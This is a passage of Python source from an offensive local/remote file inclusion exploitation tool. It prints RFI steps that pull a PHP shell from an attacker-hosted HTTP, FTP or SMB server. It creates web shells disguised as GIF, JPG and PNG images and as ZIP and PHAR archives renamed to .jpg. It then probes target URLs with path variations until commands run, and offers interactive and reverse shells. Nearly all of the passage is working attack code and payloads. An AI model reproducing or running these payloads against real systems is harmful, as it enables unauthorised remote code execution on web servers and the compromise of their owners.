            print(f"  cd /tmp && sudo python3 -m http.server {lport}")
            
            rfi_payload = f'http://{lhost}:{lport}/ghostlfi_shell.php'
            
            print(f"\n{Fore.YELLOW}[STEP 2] Include Remote Shell:{Style.RESET_ALL}")
            print(f"  {base_url}?{self.parameter}={rfi_payload}&cmd=id")
            
            print(f"\n{Fore.YELLOW}[STEP 3] Execute Commands:{Style.RESET_ALL}")
            print(f"  Change &cmd=id to any command")
            
            print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
            print(f"  curl '{base_url}?{self.parameter}={rfi_payload}&cmd=id'")
            
        elif protocol == 'ftp':
            if not lport:
                lport = 21
            print(f"\n{Fore.YELLOW}[STEP 1] Install pyftpdlib:{Style.RESET_ALL}")
            print(f"  sudo pip3 install pyftpdlib")
            
            print(f"\n{Fore.YELLOW}[STEP 2] Start FTP Server:{Style.RESET_ALL}")
            print(f"  cd /tmp && sudo python -m pyftpdlib -p {lport}")
            
            rfi_payload = f'ftp://{lhost}:{lport}/ghostlfi_shell.php'
            
            print(f"\n{Fore.YELLOW}[STEP 3] Include Remote Shell:{Style.RESET_ALL}")
            print(f"  {base_url}?{self.parameter}={rfi_payload}&cmd=id")
            
            print(f"\n{Fore.YELLOW}[STEP 4] With Authentication (if needed):{Style.RESET_ALL}")
            rfi_payload_auth = f'ftp://user:pass@{lhost}:{lport}/ghostlfi_shell.php'
            print(f"  {base_url}?{self.parameter}={rfi_payload_auth}&cmd=id")
            
            print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
            print(f"  curl '{base_url}?{self.parameter}={rfi_payload}&cmd=id'")
            
        elif protocol == 'smb':
            print(f"\n{Fore.YELLOW}[STEP 1] Install Impacket:{Style.RESET_ALL}")
            print(f"  sudo pip3 install impacket")
            
            print(f"\n{Fore.YELLOW}[STEP 2] Start SMB Server:{Style.RESET_ALL}")
            print(f"  cd /tmp && impacket-smbserver -smb2support share $(pwd)")
            
            # UNC path for Windows
            unc_payload = f'\\\\\\\\{lhost}\\\\share\\\\ghostlfi_shell.php'
            
            print(f"\n{Fore.YELLOW}[STEP 3] Include Remote Shell (UNC Path):{Style.RESET_ALL}")
            print(f"  {base_url}?{self.parameter}={unc_payload}&cmd=whoami")
            
            print(f"\n{Fore.CYAN}[CURL COMMAND - URL Encoded]{Style.RESET_ALL}")
            # URL encode the backslashes
            unc_encoded = urllib.parse.quote(f'\\\\{lhost}\\share\\ghostlfi_shell.php')
            print(f"  curl '{base_url}?{self.parameter}={unc_encoded}&cmd=whoami'")
            
            print(f"\n{Fore.CYAN}[BROWSER URL]{Style.RESET_ALL}")
            print(f"  {base_url}?{self.parameter}=\\\\{lhost}\\share\\ghostlfi_shell.php&cmd=whoami")
            
            print(f"\n{Fore.GREEN}[!] SMB works on Windows without allow_url_include!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[!] Best results on same network{Style.RESET_ALL}")
        
        return True
    
    
    # ==================== FILE UPLOAD EXPLOITATION ====================
    
    def detect_upload_forms(self) -> list:
        """Detect file upload forms on the target"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[FILE UPLOAD DETECTION] Scanning for Upload Forms")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        upload_forms = []
        
        try:
            # Get the main page
            response = self.session.get(self.target_url, proxies=self.proxy, timeout=10)
            
            # Look for file upload forms
            import re
            
            # Find input type="file"
            file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*>', response.text, re.IGNORECASE)
            
            # Find form tags with enctype
            upload_forms_html = re.findall(r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>.*?</form>', response.text, re.IGNORECASE | re.DOTALL)
            
            if file_inputs or upload_forms_html:
                print(f"{Fore.GREEN}[✓] Found {len(file_inputs)} file upload input(s)!{Style.RESET_ALL}")
                
                # Extract form action URLs
                for form in upload_forms_html:
                    action = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
                    if action:
                        upload_forms.append(action.group(1))
                        print(f"{Fore.GREEN}    Form action: {action.group(1)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] No file upload forms detected on main page{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Check for upload forms in:{Style.RESET_ALL}")
                print(f"    - Profile/Settings pages")
                print(f"    - Admin panels")
                print(f"    - User dashboard")
            
        except requests.exceptions.ConnectionError as e:
            print(f"{Fore.RED}[✗] CONNECTION FAILED: Cannot reach target!{Style.RESET_ALL}")
            print(f"{Fore.RED}    {str(e).split(':')[0]}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[!] Check if target is reachable:{Style.RESET_ALL}")
            print(f"    1. Verify target URL is correct")
            print(f"    2. Check if target is still running")
            print(f"    3. Test connection: curl {self.target_url}")
            # Re-raise to stop execution
            raise
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to detect upload forms: {str(e)}{Style.RESET_ALL}")
            # Re-raise to stop execution for any error
            raise
        
        return upload_forms
    
    def generate_image_shell(self, image_type: str = 'gif') -> tuple:
        """Generate malicious image with PHP code"""
        shells = {
            'gif': ('GIF8<?php system($_GET["cmd"]); ?>', 'shell.gif'),
            'jpg': ('\\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>', 'shell.jpg'),
            'png': ('\\x89PNG\\r\\n\\x1a\\n<?php system($_GET["cmd"]); ?>', 'shell.png'),
        }
        
        if image_type not in shells:
            image_type = 'gif'
        
        return shells[image_type]
    
    def create_malicious_images(self) -> None:
        """Create all malicious image types"""
        print(f"\n{Fore.CYAN}[CREATE SHELLS] Creating malicious images...{Style.RESET_ALL}")
        
        images = {
            'GIF': ('GIF8<?php system($_GET["cmd"]); ?>', '/tmp/shell.gif'),
            'JPG': ('\\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>', '/tmp/shell.jpg'),
            'PNG': ('\\x89PNG\\r\\n\\x1a\\n<?php system($_GET["cmd"]); ?>', '/tmp/shell.png'),
        }
        
        for img_type, (content, filepath) in images.items():
            try:
                with open(filepath, 'w') as f:
                    f.write(content)
                print(f"{Fore.GREEN}[✓] Created {img_type}: {filepath}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[✗] Failed to create {img_type}: {str(e)}{Style.RESET_ALL}")
    
    def generate_zip_shell(self) -> str:
        """Generate ZIP archive with PHP shell"""
        import zipfile
        import tempfile
        
        shell_content = '<?php system($_GET["cmd"]); ?>'
        zip_path = '/tmp/shell.jpg'
        
        try:
            # Create temp PHP file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
                f.write(shell_content)
                php_file = f.name
            
            # Create ZIP archive
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                zipf.write(php_file, 'shell.php')
            
            import os
            os.unlink(php_file)
            
            print(f"{Fore.GREEN}[✓] Created ZIP shell: {zip_path}{Style.RESET_ALL}")
            return zip_path
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to create ZIP: {str(e)}{Style.RESET_ALL}")
            return None
    
    def generate_phar_shell(self) -> str:
        """Generate PHAR archive with PHP shell"""
        phar_script = '''<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>'''
        
        try:
            # Write script
            with open('/tmp/create_phar.php', 'w') as f:
                f.write(phar_script)
            
            # Execute to create PHAR
            import subprocess
            result = subprocess.run(
                ['php', '--define', 'phar.readonly=0', '/tmp/create_phar.php'],
                cwd='/tmp',
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                # Rename to .jpg
                import os
                if os.path.exists('/tmp/shell.phar'):
                    os.rename('/tmp/shell.phar', '/tmp/shell.jpg')
                    print(f"{Fore.GREEN}[✓] Created PHAR shell: /tmp/shell.jpg{Style.RESET_ALL}")
                    return '/tmp/shell.jpg'
            else:
                print(f"{Fore.YELLOW}[!] PHAR creation requires PHP CLI{Style.RESET_ALL}")
                return None
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to create PHAR: {str(e)}{Style.RESET_ALL}")
            return None
    
    def test_file_upload_exploitation(self, upload_path: str = None) -> bool:
        """Complete file upload + LFI exploitation workflow with interactive testing"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[FILE UPLOAD + LFI] Complete Exploitation Guide")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        # Step 1: Detect upload forms
        print(f"\n{Fore.CYAN}[STEP 1] Detecting upload forms...{Style.RESET_ALL}")
        try:
            upload_forms = self.detect_upload_forms()
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            print(f"\n{Fore.RED}[✗] ABORTING: Cannot connect to target{Style.RESET_ALL}")
            print(f"{Fore.RED}    Target may be offline or unreachable{Style.RESET_ALL}")
            # Restore original URL and exit
            self.target_url = original_url
            self.parameter = original_param
            return False
        except Exception as e:
            print(f"\n{Fore.RED}[✗] ERROR: {str(e)}{Style.RESET_ALL}")
            # Restore original URL and exit
            self.target_url = original_url
            self.parameter = original_param
            return False
        
        # Check if we need different endpoint for LFI testing
        print(f"\n{Fore.YELLOW}[IMPORTANT] File upload and LFI may be on different pages!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Current target: {self.target_url}{Style.RESET_ALL}")
        
        different_page = input(f"{Fore.YELLOW}Is the LFI vulnerability on a different page? [y/N]: {Style.RESET_ALL}").strip().lower()
        
        original_url = self.target_url
        original_param = self.parameter
        
        if different_page == 'y':
            print(f"\n{Fore.CYAN}[*] Enter the page with LFI vulnerability:{Style.RESET_ALL}")
            print(f"    Example: If upload is at /settings.php")
            print(f"             but LFI is at /index.php?language=")
            print(f"    Enter: http://target.com/index.php  (just the page, no parameters)")
            
            lfi_url = input(f"{Fore.YELLOW}LFI page URL: {Style.RESET_ALL}").strip()
            
            # Strip any existing query parameters from LFI URL
            if '?' in lfi_url:
                lfi_url = lfi_url.split('?')[0]
                print(f"{Fore.YELLOW}[*] Stripped query params, using: {lfi_url}{Style.RESET_ALL}")
            
            lfi_param = input(f"{Fore.YELLOW}LFI vulnerable parameter (e.g., language, page, file): {Style.RESET_ALL}").strip()
            
            # Strip equals sign if user included it
            if lfi_param.endswith('='):
                lfi_param = lfi_param.rstrip('=')
                print(f"{Fore.YELLOW}[*] Stripped '=', using parameter: {lfi_param}{Style.RESET_ALL}")
            
            # Use 'language' as default if nothing entered
            if not lfi_param:
                lfi_param = 'language'
            
            if lfi_url:
                self.target_url = lfi_url
                self.parameter = lfi_param
                print(f"{Fore.GREEN}[✓] Will test file inclusion at: {self.target_url}?{self.parameter}={Style.RESET_ALL}")
        
        # Step 2: Create malicious files
        print(f"\n{Fore.CYAN}[STEP 2] Creating malicious files...{Style.RESET_ALL}")
        self.create_malicious_images()
        
        # Create ZIP wrapper
        print(f"\n{Fore.CYAN}[METHOD 2] ZIP Wrapper{Style.RESET_ALL}")
        self.generate_zip_shell()
        
        # Create PHAR wrapper
        print(f"\n{Fore.CYAN}[METHOD 3] PHAR Wrapper{Style.RESET_ALL}")
        self.generate_phar_shell()
        
        # Get upload path
        if not upload_path:
            print(f"\n{Fore.YELLOW}[*] Common upload paths:{Style.RESET_ALL}")
            print(f"  - ./uploads/")
            print(f"  - ./profile_images/")
            print(f"  - ./files/")
            print(f"  - ./images/")
            print(f"  - ./assets/uploads/")
            upload_path = './uploads/'
        
        # Provide exploitation guide
        self._show_file_upload_guide(upload_path)
        
        # Interactive menu
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[INTERACTIVE MODE] Choose exploitation method")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}Available methods:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}1{Style.RESET_ALL} - Malicious GIF (Most reliable)")
        print(f"  {Fore.CYAN}2{Style.RESET_ALL} - Malicious JPG")
        print(f"  {Fore.CYAN}3{Style.RESET_ALL} - Malicious PNG")
        print(f"  {Fore.CYAN}4{Style.RESET_ALL} - ZIP Wrapper (zip://)")
        print(f"  {Fore.CYAN}5{Style.RESET_ALL} - PHAR Wrapper (phar://)")
        print(f"  {Fore.CYAN}6{Style.RESET_ALL} - Try all methods automatically")
        print(f"  {Fore.CYAN}0{Style.RESET_ALL} - Skip testing")
        
        try:
            choice = input(f"\n{Fore.YELLOW}Select method [1-6, 0 to skip]: {Style.RESET_ALL}").strip()
            
            if choice == '0':
                print(f"{Fore.YELLOW}[*] Skipping automatic testing{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Files are ready in /tmp/ for manual upload{Style.RESET_ALL}")
                # Restore original URL
                self.target_url = original_url
                self.parameter = original_param
                return False
            
            # Ask about file upload
            print(f"\n{Fore.YELLOW}[!] IMPORTANT: You need to upload the file first!{Style.RESET_ALL}")
            if different_page == 'y':
                print(f"{Fore.YELLOW}[!] Upload at: {original_url}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Will test inclusion at: {self.target_url}?{self.parameter}={Style.RESET_ALL}")
            
            uploaded = input(f"{Fore.YELLOW}Have you uploaded the file? [y/N]: {Style.RESET_ALL}").strip().lower()
            
            if uploaded != 'y':
                print(f"\n{Fore.CYAN}[INSTRUCTIONS]{Style.RESET_ALL}")
                print(f"1. Go to the file upload form: {original_url}")
                print(f"2. Upload the appropriate file from /tmp/")
                print(f"3. Note the upload path if shown")
                print(f"4. Run this command again and select 'y'")
                # Restore original URL
                self.target_url = original_url
                self.parameter = original_param
                return False
            
            # Get upload path from user
            custom_path = input(f"{Fore.YELLOW}Enter upload path or full URL (e.g., /profile_images/ OR http://target.com/profile_images/shell.jpg): {Style.RESET_ALL}").strip()
            if custom_path:
                upload_path = custom_path
            
            # Test based on choice
            result = False
            if choice == '1':
                result = self._test_malicious_image(upload_path, 'shell.gif')
            elif choice == '2':
                result = self._test_malicious_image(upload_path, 'shell.jpg')
            elif choice == '3':
                result = self._test_malicious_image(upload_path, 'shell.png')
            elif choice == '4':
                result = self._test_zip_wrapper(upload_path)
            elif choice == '5':
                result = self._test_phar_wrapper(upload_path)
            elif choice == '6':
                result = self._test_all_upload_methods(upload_path)
            else:
                print(f"{Fore.RED}[✗] Invalid choice{Style.RESET_ALL}")
            
            # Restore original URL
            self.target_url = original_url
            self.parameter = original_param
            return result
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
            # Restore original URL
            self.target_url = original_url
            self.parameter = original_param
            return False
        except Exception as e:
            print(f"{Fore.RED}[✗] Error: {str(e)}{Style.RESET_ALL}")
            # Restore original URL
            self.target_url = original_url
            self.parameter = original_param
            return False
    
    def _show_file_upload_guide(self, upload_path: str):
        """Show file upload exploitation guide"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[EXPLOITATION WORKFLOW]")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        base_url = self.target_url.split('?')[0]
        
        # Method 1: Simple Image Upload
        print(f"\n{Fore.GREEN}━━━ METHOD 1: Malicious Image (Most Reliable) ━━━{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Step 1: Upload the image{Style.RESET_ALL}")
        print(f"  File: /tmp/shell.gif")
        print(f"  Upload via the web form")
        
        print(f"\n{Fore.YELLOW}Step 2: Find uploaded file path{Style.RESET_ALL}")
        print(f"  - Check page source after upload")
        print(f"  - Look for: <img src=\"/path/to/shell.gif\">")
        print(f"  - Or guess: {upload_path}shell.gif")
        
        print(f"\n{Fore.YELLOW}Step 3: Include via LFI{Style.RESET_ALL}")
        print(f"  {base_url}?{self.parameter}={upload_path}shell.gif&cmd=id")
        
        print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
        print(f"  curl '{base_url}?{self.parameter}={upload_path}shell.gif&cmd=id'")
        
        print(f"\n{Fore.CYAN}[TEST WITH BROWSER]{Style.RESET_ALL}")
        print(f"  {base_url}?{self.parameter}={upload_path}shell.gif&cmd=whoami")
        
        # Method 2: ZIP Wrapper
        print(f"\n{Fore.GREEN}━━━ METHOD 2: ZIP Wrapper (If enabled) ━━━{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Step 1: Upload the ZIP{Style.RESET_ALL}")
        print(f"  File: /tmp/shell.jpg (it's actually a ZIP)")
        print(f"  Upload via the web form")
        
        print(f"\n{Fore.YELLOW}Step 2: Include with zip:// wrapper{Style.RESET_ALL}")
        print(f"  {base_url}?{self.parameter}=zip://{upload_path}shell.jpg%23shell.php&cmd=id")
        
        print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
        print(f"  curl '{base_url}?{self.parameter}=zip://{upload_path}shell.jpg%23shell.php&cmd=id'")
        
        # Method 3: PHAR Wrapper
        print(f"\n{Fore.GREEN}━━━ METHOD 3: PHAR Wrapper (PHP-specific) ━━━{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Step 1: Upload the PHAR{Style.RESET_ALL}")
        print(f"  File: /tmp/shell.jpg (it's actually a PHAR)")
        print(f"  Upload via the web form")
        
        print(f"\n{Fore.YELLOW}Step 2: Include with phar:// wrapper{Style.RESET_ALL}")
        print(f"  {base_url}?{self.parameter}=phar://{upload_path}shell.jpg/shell.txt&cmd=id")
        
        print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
        print(f"  curl '{base_url}?{self.parameter}=phar://{upload_path}shell.jpg/shell.txt&cmd=id'")
        
        # Troubleshooting
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[TROUBLESHOOTING]")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}If upload path unknown:{Style.RESET_ALL}")
        print(f"  1. Check page source after upload for image URL")
        print(f"  2. Look for: <img src='/profile_images/shell.jpg'>")
        print(f"  3. Extract just the path: /profile_images/")
        print(f"  4. Or paste full: http://target.com/profile_images/shell.jpg")
        print(f"     Tool will extract the path automatically!")
        print(f"  5. Use browser DevTools Network tab")
        print(f"  6. Fuzz common paths:")
        print(f"     - ./uploads/, ./profile_images/, ./files/")
        
        print(f"\n{Fore.YELLOW}If simple image doesn't work:{Style.RESET_ALL}")
        print(f"  1. Try different extensions: .gif, .jpg, .png")
        print(f"  2. Try ZIP wrapper method")
        print(f"  3. Try PHAR wrapper method")
        print(f"  4. Check if path traversal needed: ../../uploads/shell.gif")
        
        print(f"\n{Fore.YELLOW}If still not working:{Style.RESET_ALL}")
        print(f"  1. Verify file was actually uploaded")
        print(f"  2. Check if upload directory is correct")
        print(f"  3. Try accessing the image directly first")
        print(f"  4. Ensure include() function allows code execution")
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"[✓] All malicious files created in /tmp/")
        print(f"[✓] Upload any of them and follow the steps above!")
        print(f"{'='*60}{Style.RESET_ALL}")
    
    def _test_malicious_image(self, upload_path: str, filename: str) -> bool:
        """Test malicious image exploitation"""
        print(f"\n{Fore.CYAN}[TESTING] Malicious Image: {filename}{Style.RESET_ALL}")
        
        # Clean up upload path
        original_path = upload_path
        
        # If user entered full URL, extract path
        if 'http://' in upload_path or 'https://' in upload_path:
            import re
            match = re.search(r'https?://[^/]+(/.*)', upload_path)
            if match:
                upload_path = match.group(1)
                print(f"{Fore.YELLOW}[*] Extracted path from URL: {upload_path}{Style.RESET_ALL}")
        
        # If path contains a filename (user entered existing uploaded file), extract directory
        if any(upload_path.endswith(ext) for ext in ['.jpg', '.jpeg', '.gif', '.png', '.bmp', '.webp', '.svg']):
            upload_path = '/'.join(upload_path.split('/')[:-1]) + '/'
            print(f"{Fore.YELLOW}[*] Extracted directory: {upload_path}{Style.RESET_ALL}")
        
        # Ensure path ends with /
        if not upload_path.endswith('/'):
            upload_path += '/'
        
        test_path = f'{upload_path}{filename}'
        
        print(f"{Fore.YELLOW}[*] Testing with: {test_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Trying common upload paths...{Style.RESET_ALL}")
        
        # Try different path variations
        paths_to_try = [
            test_path,
            f'.{test_path}',
            f'..{test_path}',
            f'../..{test_path}',
            f'./{upload_path}{filename}',
            f'../{upload_path}{filename}',
            f'../../{upload_path}{filename}',
        ]
        
        for path in paths_to_try:
            full_url = f"{self.target_url}?{self.parameter}={path}&cmd=id"
            print(f"{Fore.YELLOW}[*] Testing: {full_url}{Style.RESET_ALL}")
            
            try:
                response = self._send_payload(path + '&cmd=id', timeout=10)
                
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"{Fore.GREEN}[✓] SUCCESS! File upload LFI working!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Path: {path}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Output: {response.text[:300]}{Style.RESET_ALL}")
                    
                    self.rce_method = 'file_upload'
                    self.successful_methods.append(f'File Upload ({filename})')
                    
                    # Offer interactive shell
                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via File Upload!{Style.RESET_ALL}")
                    shell_choice = input(f"{Fore.YELLOW}Start interactive shell? [Y/n]: {Style.RESET_ALL}").strip().lower()
                    if shell_choice != 'n':
                        self.interactive_shell()
                    
                    return True
            except Exception as e:
                continue
        
        print(f"{Fore.RED}[✗] Malicious image method failed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Make sure:{Style.RESET_ALL}")
        print(f"  1. File was uploaded successfully")
        print(f"  2. Upload path is correct")
        print(f"  3. Try other methods (ZIP/PHAR)")
        print(f"{Fore.YELLOW}[*] Original path you entered: {original_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Tool tested with: {test_path}{Style.RESET_ALL}")
        return False
    
    def _test_zip_wrapper(self, upload_path: str) -> bool:
        """Test ZIP wrapper exploitation"""
        print(f"\n{Fore.CYAN}[TESTING] ZIP Wrapper Method{Style.RESET_ALL}")
        
        # Clean up upload path
        original_path = upload_path
        
        # If user entered full URL, extract path
        if 'http://' in upload_path or 'https://' in upload_path:
            import re
            match = re.search(r'https?://[^/]+(/.*)', upload_path)
            if match:
                upload_path = match.group(1)
                print(f"{Fore.YELLOW}[*] Extracted path from URL: {upload_path}{Style.RESET_ALL}")
        
        # If path contains a filename, extract directory
        if any(upload_path.endswith(ext) for ext in ['.jpg', '.jpeg', '.gif', '.png', '.bmp', '.webp', '.svg']):
            upload_path = '/'.join(upload_path.split('/')[:-1]) + '/'
            print(f"{Fore.YELLOW}[*] Extracted directory: {upload_path}{Style.RESET_ALL}")
        
        # Ensure path ends with /
        if not upload_path.endswith('/'):
            upload_path += '/'
        
        # Remove leading ./ if present for clean path
        clean_path = upload_path.replace('./', '')
        
        print(f"{Fore.YELLOW}[*] Testing with path: {clean_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Trying common upload paths with zip:// wrapper...{Style.RESET_ALL}")
        
        # Build paths - DO NOT pre-encode # in the zip path!
        # requests library will handle URL encoding when sending
        paths_to_try = [
            f'zip://.{clean_path}shell.jpg#shell.php',
            f'zip://{clean_path}shell.jpg#shell.php',
            f'zip://./{clean_path}shell.jpg#shell.php',
            f'zip://../{clean_path}shell.jpg#shell.php',
            f'zip://../../{clean_path}shell.jpg#shell.php',
        ]
        
        for path in paths_to_try:
            full_url = f"{self.target_url}?{self.parameter}={path}&cmd=id"
            print(f"{Fore.YELLOW}[*] Testing: {full_url}{Style.RESET_ALL}")
            
            try:
                response = self._send_payload(path + '&cmd=id', timeout=10)
                
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"{Fore.GREEN}[✓] SUCCESS! ZIP wrapper working!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Path: {path}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Output: {response.text[:300]}{Style.RESET_ALL}")
                    
                    self.rce_method = 'zip_wrapper'
                    self.successful_methods.append('ZIP Wrapper')
                    
                    # Offer interactive shell
                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via ZIP Wrapper!{Style.RESET_ALL}")
                    shell_choice = input(f"{Fore.YELLOW}Start interactive shell? [Y/n]: {Style.RESET_ALL}").strip().lower()
                    if shell_choice != 'n':
                        self.interactive_shell()
                    
                    return True
            except Exception as e:
                continue
        
        print(f"{Fore.RED}[✗] ZIP wrapper method failed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] ZIP wrapper may not be enabled{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Original path you entered: {original_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Tool tested with: {clean_path}shell.jpg{Style.RESET_ALL}")
        return False
    
    def _test_phar_wrapper(self, upload_path: str) -> bool:
        """Test PHAR wrapper exploitation"""
        print(f"\n{Fore.CYAN}[TESTING] PHAR Wrapper Method{Style.RESET_ALL}")
        
        # Clean up upload path
        original_path = upload_path
        
        # Check if user entered URL without http:// (e.g., "94.237.122.241:41239/path")
        # Pattern: IP:PORT/path or domain:port/path
        import re
        if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+/', upload_path) or re.match(r'^[a-zA-Z0-9.-]+:\d+/', upload_path):
            print(f"{Fore.YELLOW}[!] Detected URL without http:// prefix{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Input: {upload_path}{Style.RESET_ALL}")
            # Extract just the path part (everything after port/)
            parts = upload_path.split('/', 1)
            if len(parts) > 1:
                upload_path = '/' + parts[1]
                print(f"{Fore.GREEN}[*] Extracted path: {upload_path}{Style.RESET_ALL}")
        
        # If user entered full URL, extract path
        elif 'http://' in upload_path or 'https://' in upload_path:
            match = re.search(r'https?://[^/]+(/.*)', upload_path)
            if match:
                upload_path = match.group(1)
                print(f"{Fore.YELLOW}[*] Extracted path from URL: {upload_path}{Style.RESET_ALL}")
        
        # If path contains a filename (ends with common extensions), extract directory
        if any(upload_path.endswith(ext) for ext in ['.jpg', '.jpeg', '.gif', '.png', '.bmp', '.webp', '.svg']):
            # Extract directory from filename
            upload_path = '/'.join(upload_path.split('/')[:-1]) + '/'
            print(f"{Fore.YELLOW}[*] Extracted directory: {upload_path}{Style.RESET_ALL}")
        
        # Ensure path ends with /
        if not upload_path.endswith('/'):
            upload_path += '/'
        
        # Remove leading ./ if present for clean path
        clean_path = upload_path.replace('./', '')
        
        print(f"{Fore.GREEN}[*] Final path to test: {clean_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Trying common upload paths with phar:// wrapper...{Style.RESET_ALL}")
        
        # Build paths - DO NOT pre-encode / in the phar path!
        # requests library will handle URL encoding when sending
        paths_to_try = [
            f'phar://.{clean_path}shell.jpg/shell.txt',
            f'phar://{clean_path}shell.jpg/shell.txt',
            f'phar://./{clean_path}shell.jpg/shell.txt',
            f'phar://../{clean_path}shell.jpg/shell.txt',
            f'phar://../../{clean_path}shell.jpg/shell.txt',
        ]
        
        for path in paths_to_try:
            full_url = f"{self.target_url}?{self.parameter}={path}&cmd=id"
            print(f"{Fore.YELLOW}[*] Testing: {full_url}{Style.RESET_ALL}")
            
            try:
                response = self._send_payload(path + '&cmd=id', timeout=10)
                
                # Debug: Show response snippet
                response_snippet = response.text[:500].replace('\n', ' ')
                print(f"{Fore.CYAN}[DEBUG] Response snippet: {response_snippet[:200]}...{Style.RESET_ALL}")
                
                # Check for RCE indicators
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"{Fore.GREEN}[✓] SUCCESS! PHAR wrapper working!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Path: {path}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Output: {response.text[:300]}{Style.RESET_ALL}")
                    
                    self.rce_method = 'phar_wrapper'
                    self.successful_methods.append('PHAR Wrapper')
                    
                    # Offer interactive shell
                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via PHAR Wrapper!{Style.RESET_ALL}")
                    shell_choice = input(f"{Fore.YELLOW}Start interactive shell? [Y/n]: {Style.RESET_ALL}").strip().lower()
                    if shell_choice != 'n':
                        self.interactive_shell()
                    
                    return True
            except Exception as e:
                print(f"{Fore.RED}[DEBUG] Error: {str(e)}{Style.RESET_ALL}")
                continue
        
        # If auto-detection failed, ask user
        print(f"\n{Fore.YELLOW}[!] Automatic detection failed.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[?] Did you manually verify any of the URLs worked?{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    Copy one of the URLs above and test in browser.{Style.RESET_ALL}")
        manual_check = input(f"{Fore.YELLOW}Did it work manually? [y/N]: {Style.RESET_ALL}").strip().lower()
        
        if manual_check == 'y':
            print(f"{Fore.GREEN}[✓] Manual verification successful!{Style.RESET_ALL}")
            which_url = input(f"{Fore.YELLOW}Which URL worked? (enter number 1-5): {Style.RESET_ALL}").strip()
            try:
                url_index = int(which_url) - 1
                if 0 <= url_index < len(paths_to_try):
                    working_path = paths_to_try[url_index]
                    print(f"{Fore.GREEN}[✓] Using: {working_path}{Style.RESET_ALL}")
                    
                    self.rce_method = 'phar_wrapper'
                    self.successful_methods.append('PHAR Wrapper (Manual)')
                    
                    # Store the working payload for shell
                    self.lfi_payload = working_path
                    
                    # Offer shells
                    print(f"\n{Fore.GREEN}[✓] RCE Confirmed via PHAR Wrapper!{Style.RESET_ALL}")
                    print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
                    print(f"  1 - Interactive web shell")
                    print(f"  2 - Reverse shell")
                    print(f"  3 - Both")
                    print(f"  0 - Skip")
                    
                    shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
                    
                    if shell_choice == '1':
                        self.interactive_shell()
                    elif shell_choice == '2':
                        self.generate_reverse_shell()
                    elif shell_choice == '3':
                        self.generate_reverse_shell()
